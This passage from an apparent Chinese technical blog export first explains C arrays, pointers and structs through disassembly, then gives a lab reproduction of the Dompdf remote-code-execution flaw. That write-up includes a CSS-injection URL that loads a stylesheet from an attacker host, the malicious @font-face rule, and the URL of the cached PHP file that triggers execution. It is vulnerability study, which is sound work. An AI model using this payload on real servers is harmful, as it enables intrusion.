<p>这里的字符串为11字节，不为4的倍数。其中前八个字节数据复制过程没有变化，最后三个字节被分割为两部分，先使用dx复制两字节的数据，在使用al复制一个字节数据。</p>
<h2 id="数组作为参数"><a href="#数组作为参数" class="headerlink" title="数组作为参数"></a>数组作为参数</h2><p>当数组作为参数进行传递时，数组所占内存大小通常大于4字节。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">char</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">strcpy</span>(a,<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	show(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main()函数关键反汇编代码如下</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308221841271.png" class title="image-20230308221841271">

<p>先对数组进行初始化为0，将数组首地址作为参数调用show函数。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308222455518.png" class title="image-20230308222455518">

<p>在show函数中，取常量“Hello World”首地址和函数参数首地址压入栈中作为strcpy函数的参数，然后add esp 8指令用来平衡栈。</p>
<p>可以观察到当数组作为函数形参时，函数参数保存的是数组的首地址，是一个指针变量。使用sizeof(数组名)可以获取数组的大小，而对指针或者形参中保存的数组名使用sizeof只能得到当前平台的指针长度，32位环境下指针长度位4字节。应当使用**strlen()**函数获取字符串长度。</p>
<h2 id="数组作为返回值"><a href="#数组作为返回值" class="headerlink" title="数组作为返回值"></a>数组作为返回值</h2><p>数组作为返回值和数组作为函数参数大同小异，都是将数组首地址以指针方式进行传递。而两者也有不同，当数组作为函数参数时，其定义的作用域必然在函数调用之前就已经存在；但数组作为局部变量数据时，当退出函数时需平衡栈，产生了稳定性问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">char* show()</span><br><span class="line">&#123;</span><br><span class="line">	char buff[] = &#123;&quot;Hello World&quot;&#125;;</span><br><span class="line">	return buff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;%s \r\n&quot;,show());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show函数关键反汇编代码如下，使用eax、ecx、edx三个寄存器传递对字符串数组初始化字符串，最后使用eax保存数组首地址作为函数返回值。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309083657878.png" class title="image-20230309083657878">

<p>main函数关键反汇编代码如下，由于eax保存数组首地址将其压入栈中，最后栈平衡。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309084218952.png" class title="image-20230309084218952">

<p>由于数组buff为局部变量，其地址是栈空间中的某段内存空间，其中的数据会在作用域切换时被新数据替换，因此返回地址随时会产生错误。要想避免该错误，可以使用全局数组、静态数组或者上层函数中定义的局部数组。</p>
<p><strong>使用全局数组</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int a[5] = &#123;1,2,3,4,5&#125;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	int* pint = a;</span><br><span class="line">	do&#123;</span><br><span class="line">		printf(&quot;%d \r\n&quot;,*pint);</span><br><span class="line">		pint++;</span><br><span class="line">	&#125;while(pint&lt;a+5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编关键代码如下</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309090735648.png" class title="image-20230309090735648">

<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309091149378.png" class title="image-20230309091149378">

<p>循环体中使用”cmp     [ebp+var_4], offset unk_42B63C”与常量值相比，这里常量地址为0042B63C，而数组首地址为42B628，所以常量地址正是全局数据的结尾地址。</p>
<h2 id="下标寻址和指针寻址"><a href="#下标寻址和指针寻址" class="headerlink" title="下标寻址和指针寻址"></a>下标寻址和指针寻址</h2><p>访问数组有两种方式：下标寻址和通过指针寻址。指针寻址的方式不但没有下标寻址方式便利，效率也比下标寻址低，我们来看下两者区别。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * a = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> buff [] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">	a=buff;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c\r\n&quot;</span>,*a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c\r\n&quot;</span>,buff[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编关键代码如下</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309094749811.png" class title="image-20230309094749811">

<p>首先对指针变量var_4进行初始化，将”Hello World”子符串传递给buff数组，使用edx获取数组首地址，取出指针变量中保存的地址数据，使用movsx指令对地址实现间接访问其他的数据；而下标寻址则是直接将数组首地址的数据传给edx压入栈中。指针寻址需要经过2次寻址才能得到目标数据，而下标寻址只需1次寻址就可以得到，由此可以得出结论，下标寻址比指针寻址操作效率高。</p>
<p>但是使用下标寻址的话，需要注意越界访问的错误。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> number = <span class="number">5</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,a[<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于vc++6.0没有对数组下标进行访问检查，程序运行结果为5</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309101704956.png" class title="image-20230309101704956">

<p>运行结果为什么为5呢？我们来看下其反汇编关键代码</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309101921611.png" class title="image-20230309101921611">

<p>可以从反汇编代码中看到此时a[-1]的地址为ebp-14h，这正是number变量所在的地址，根据局部变量定义，人为将变量定义在数组之下，从而造成负数下标的越界访问。</p>
<h2 id="存放指针类型数据的数组"><a href="#存放指针类型数据的数组" class="headerlink" title="存放指针类型数据的数组"></a>存放指针类型数据的数组</h2><p>存放指针类型数据的数组就是数组中各数据元素都是由相同类型的指针组成的。对指针数组的数据访问需要对其进行间接访问。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * a[<span class="number">3</span>] = &#123;<span class="string">&quot;Hello &quot;</span>,<span class="string">&quot;World &quot;</span>,<span class="string">&quot;! \r\n&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编关键代码为</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309145007008.png" class title="image-20230309145007008">

<p>指针数组中存储这每个字符串的首地址，二维字符数组存储着每个字符的字符数据。</p>
<h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>函数指针是用来保存函数指针首地址的指针变量。定义如下：返回值类型  (* 函数指针变量名称) (参数信息)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;show\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">void</span></span> (*a)()=&amp;show;</span><br><span class="line">	<span class="built_in">a</span>();</span><br><span class="line">	<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编关键代码如下</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230309151147156.png" class title="image-20230309151147156">

<p>其过程是将show函数地址入口取出保存在指针变量a中，然后再调用a保存的地址，与函数直接调用需要间接调用。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础-结构体与类</title>
    <url>/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8E%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础-结构体与类"><a href="#C语言代码逆向基础-结构体与类" class="headerlink" title="C语言代码逆向基础-结构体与类"></a>C语言代码逆向基础-结构体与类</h1><h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h2><p>对象中先定义的数据成员再低地址处，后定义的数据成员再高地址处。</p>
<p>一般情况下，对象长度&#x3D;sizeof(数据成员1)+…+sizeof(数据成员)</p>
<p>但仍有三种情况：空类、内存对齐、静态数据成员</p>
<p><strong>空类</strong></p>
<p>空类中没有任何成员数据，但需要实例化，所以为1字节</p>
<p><strong>内存对齐</strong></p>
<p>数据成员是根据再类或结构体中的顺序来一次申请内存空间的，由于数据类型不同，占用内存空间不同，实际对齐值q&#x3D;min(M,N),M为数据成员长度，N为指定对齐值，其成员地址安排再q的倍数上。VC++6.0默认对齐值为8。</p>
<p><strong>静态数据成员</strong></p>
<p>与静态局部变量类似，存放的位置和全局变量一致。再作用域之外不可见，同类对象将共同享用静态数据成员的空间。</p>
<h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><p>this属于指针变量，再32位环境下占4字节，保存的是数据地址信息。  </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setnumber</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		nint = number;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> nint;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test a;</span><br><span class="line">	a.<span class="built_in">setnumber</span>(<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;test: %d \r\n&quot;</span>,a.nint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main()反汇编关键代码如下，取出test的首地址存入ecx，然后调用setnumber()中m_nint的数据存入eax中。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8E%E7%B1%BB/image-20230309171602636.png" class title="image-20230309171602636">

<p>setnumber()函数关键反汇编代码如下，这里的eax保存的是对象的首地址，即this指针，然后将地址传递给[ebp-4]地址处，取出地址保存在eax中，取出参数中的数据保存再ecx中，最后将ecx的数据保存再对象首地址，即对nint进行赋值。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8E%E7%B1%BB/image-20230309172149471.png" class title="image-20230309172149471">

<p>在成员函数中访问数据成员通过this指针间接访问的。this指针关键点是在函数过程中使用了ecx作为第一个参数，在ecx中保存对象首地址。</p>
<h2 id="对象作为函数参数"><a href="#对象作为函数参数" class="headerlink" title="对象作为函数参数"></a>对象作为函数参数</h2><p>对象作为函数的参数时，先将对象中的所有数据进行备份，然后将复制的数据作为形参传递到调用函数中使用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> none;</span><br><span class="line">	<span class="keyword">int</span> ntwo;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setnumber</span><span class="params">(test a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\r\n&quot;</span>,a.none,a.ntwo);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test b;</span><br><span class="line">	b.none=<span class="number">1</span>;</span><br><span class="line">	b.ntwo=<span class="number">2</span>;</span><br><span class="line">	<span class="built_in">setnumber</span>(b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main()关键代码如下</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8E%E7%B1%BB/image-20230309175444193.png" class title="image-20230309175444193">

<p>将对象的两个成员变量一次压栈(按照先定义的数据成员最后压栈，后定义的数据先压栈)，他们除了数据相同外，与对象中的两个数据成员没有关系。</p>
<h2 id="对象作为返回值"><a href="#对象作为返回值" class="headerlink" title="对象作为返回值"></a>对象作为返回值</h2><p>对象作为返回值时，进入函数之前将申请返回对象使用的栈空间，在退出函数时，将返回对象中的数据复制到临时的栈空间中，以这个临时栈空间的首地址作为返回值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	<span class="keyword">int</span> array[<span class="number">5</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">test <span class="title">gettest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test a;</span><br><span class="line">	a.number = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a.array[i] = i+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test b;</span><br><span class="line">	b = <span class="built_in">gettest</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\r\n&quot;</span>,b.number,b.array[<span class="number">0</span>],b.array[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取返回对象的栈空间首地址，然后将对象的首地址压入栈中，用于保存返回对象的数据。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8E%E7%B1%BB/image-20230309210026570.png" class title="image-20230309210026570">

<p>在函数调用结束后进行了数据复制，将局部对象的数据复制到这个返回对象的空间中，再将这个返回的对象复制给目标对象。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Dompdf命令执行漏洞</title>
    <url>/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Dompdf命令执行漏洞"><a href="#Dompdf命令执行漏洞" class="headerlink" title="Dompdf命令执行漏洞"></a>Dompdf命令执行漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dompdf是一种基于php的HTML到PDF的转换器。该漏洞通过将CSS注入到Dompdf处理的数据中，存储在一个php缓存文件扩展名的恶意字段中，然后通过web访问执行。</p>
<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420143147753.png" class title="image-20220420143147753">

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/positive-security/dompdf-rce</span><br></pre></td></tr></table></figure>



<p>运行测试主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd application</span><br><span class="line">php -S localhost:9000</span><br></pre></td></tr></table></figure>

<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144612188.png" class title="image-20220420144612188">

<p>运行攻击主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd exploit</span><br><span class="line">php -S localhost:9001</span><br></pre></td></tr></table></figure>

<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144650145.png" class title="image-20220420144650145">

<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>远程加载资源，将在应用服务器本地缓存资源文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=%3Clink%20rel=stylesheet%20href=%27http://localhost:9001/exploit.css%27%3E</span><br></pre></td></tr></table></figure>

<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144937511.png" class title="image-20220420144937511">

<p>访问缓存的php font文件，触发漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</span><br></pre></td></tr></table></figure>

<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144948915.png" class title="image-20220420144948915">

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在dompdf的配置文件中，当设置了$isRemoteEnabled（无论设置何值）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private $isRemoteEnabled = false;</span><br></pre></td></tr></table></figure>

<p>都允许dompdf通过font-face CSS规则加载自定义字体，如exploit.css文件所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">    font-family:&#x27;exploitfont&#x27;;</span><br><span class="line">    src:url(&#x27;http://localhost:9001/exploit_font.php&#x27;);</span><br><span class="line">    font-weight:&#x27;normal&#x27;;</span><br><span class="line">    font-style:&#x27;normal&#x27;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>当使用外部字体是，dompdf将其缓存在本地&#x2F;lib&#x2F;fonts目录下，并在dompdf_font_family_cache.php中添加相应的条目savaFontFailies()。</p>
<p>如上面加载远程的css文件，在dompdf_font_family_cache文件中可找到其对应的条目</p>
<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420153510847.png" class title="image-20220420153510847">

<p>并且在目录下找到转换后的文件</p>
<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420153704816.png" class title="image-20220420153704816">

<p>漏洞点在FontMetrics.php中的registerFont方法字体缓存中，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function registerFont($style, $remoteFile, $context = null)</span><br><span class="line">   &#123;</span><br><span class="line">       $fontname = mb_strtolower($style[&quot;family&quot;]);</span><br><span class="line">       $families = $this-&gt;getFontFamilies();</span><br><span class="line"></span><br><span class="line">       $entry = [];</span><br><span class="line">       if (isset($families[$fontname])) &#123;</span><br><span class="line">           $entry = $families[$fontname];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $styleString = $this-&gt;getType(&quot;&#123;$style[&#x27;weight&#x27;]&#125; &#123;$style[&#x27;style&#x27;]&#125;&quot;);</span><br><span class="line"></span><br><span class="line">       $fontDir = $this-&gt;options-&gt;getFontDir();</span><br><span class="line">       $remoteHash = md5($remoteFile);</span><br><span class="line"></span><br><span class="line">       $prefix = $fontname . &quot;_&quot; . $styleString;</span><br><span class="line">       $prefix = trim($prefix, &quot;-&quot;);</span><br><span class="line">       if (function_exists(&#x27;iconv&#x27;)) &#123;</span><br><span class="line">           $prefix = @iconv(&#x27;utf-8&#x27;, &#x27;us-ascii//TRANSLIT&#x27;, $prefix);</span><br><span class="line">       &#125;</span><br><span class="line">       $prefix_encoding = mb_detect_encoding($prefix, mb_detect_order(), true);</span><br><span class="line">       $substchar = mb_substitute_character();</span><br><span class="line">       mb_substitute_character(0x005F);</span><br><span class="line">       $prefix = mb_convert_encoding($prefix, &quot;ISO-8859-1&quot;, $prefix_encoding);</span><br><span class="line">       mb_substitute_character($substchar);</span><br><span class="line">       $prefix = preg_replace(&quot;[\W]&quot;, &quot;_&quot;, $prefix);</span><br><span class="line">       $prefix = preg_replace(&quot;/[^-_\w]+/&quot;, &quot;&quot;, $prefix);</span><br><span class="line"></span><br><span class="line">       $localFile = $fontDir . &quot;/&quot; . $prefix . &quot;_&quot; . $remoteHash;</span><br><span class="line"></span><br><span class="line">       if (isset($entry[$styleString]) &amp;&amp; $localFile == $entry[$styleString]) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $cacheEntry = $localFile;</span><br><span class="line">       $localFile .= &quot;.&quot;.strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">       $entry[$styleString] = $cacheEntry;</span><br><span class="line"></span><br><span class="line">       // Download the remote file</span><br><span class="line">       [$protocol] = Helpers::explode_url($remoteFile);</span><br><span class="line">       if (!$this-&gt;options-&gt;isRemoteEnabled() &amp;&amp; ($protocol !== &quot;&quot; &amp;&amp; $protocol !== &quot;file://&quot;)) &#123;</span><br><span class="line">           Helpers::record_warnings(E_USER_WARNING, &quot;Remote font resource $remoteFile referenced, but remote file download is disabled.&quot;, __FILE__, __LINE__);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line">       if ($protocol === &quot;&quot; || $protocol === &quot;file://&quot;) &#123;</span><br><span class="line">           $realfile = realpath($remoteFile);</span><br><span class="line"></span><br><span class="line">           $rootDir = realpath($this-&gt;options-&gt;getRootDir());</span><br><span class="line">           if (strpos($realfile, $rootDir) !== 0) &#123;</span><br><span class="line">               $chroot = $this-&gt;options-&gt;getChroot();</span><br><span class="line">               $chrootValid = false;</span><br><span class="line">               foreach ($chroot as $chrootPath) &#123;</span><br><span class="line">                   $chrootPath = realpath($chrootPath);</span><br><span class="line">                   if ($chrootPath !== false &amp;&amp; strpos($realfile, $chrootPath) === 0) &#123;</span><br><span class="line">                       $chrootValid = true;</span><br><span class="line">                       break;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               if ($chrootValid !== true) &#123;</span><br><span class="line">                   Helpers::record_warnings(E_USER_WARNING, &quot;Permission denied on $remoteFile. The file could not be found under the paths specified by Options::chroot.&quot;, __FILE__, __LINE__);</span><br><span class="line">                   return false;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (!$realfile) &#123;</span><br><span class="line">               Helpers::record_warnings(E_USER_WARNING, &quot;File &#x27;$realfile&#x27; not found.&quot;, __FILE__, __LINE__);</span><br><span class="line">               return false;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $remoteFile = $realfile;</span><br><span class="line">       &#125;</span><br><span class="line">       list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context);</span><br><span class="line">       if ($remoteFileContent === null) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $localTempFile 